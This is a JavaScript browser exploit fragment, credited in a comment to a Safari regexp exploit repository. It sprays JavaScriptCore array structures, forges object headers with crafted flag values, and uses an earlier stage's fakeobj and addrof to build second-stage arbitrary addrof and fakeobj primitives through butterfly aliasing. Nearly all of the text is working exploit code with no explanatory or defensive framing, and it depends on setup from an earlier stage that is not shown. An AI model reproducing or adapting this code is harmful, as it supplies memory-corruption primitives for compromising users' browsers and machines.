//Original : https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html
var structure_spray = [];
for(var i=0; i<1000; i++) {
    var array = [13.37];
    array.a = 13.37;
    array['p'+i] = 13.37;
    structure_spray.push(array)
}
var victim = structure_spray[510];

u32[0] = 0x200;
u32[1] = 0x01082007 - 0x10000;
var flags_double = f64[0];

u32[1] = 0x01082009 - 0x10000;
var flags_contiguous = f64[0];

var outer = {
    header: flags_contiguous, // cell
    butterfly: victim, // butterfly
};

var hax = stage1.fakeobj(stage1.addrof(outer) + 0x10);

var unboxed = eval(`[${'13.37,'.repeat(unboxed_size)}]`);
unboxed[0] = 4.2; // no CopyOnWrite

var boxed = [{}];

hax[1] = unboxed;
var unboxedButterfly = victim[1];

hax[1] = boxed;
victim[1] = unboxedButterfly;

function stage2_addrof(obj){
    boxed[0] = obj;
    return unboxed[0];
}

function stage2_fakeobj(dbl){
    unboxed[0] = dbl;
    return boxed[0];
}

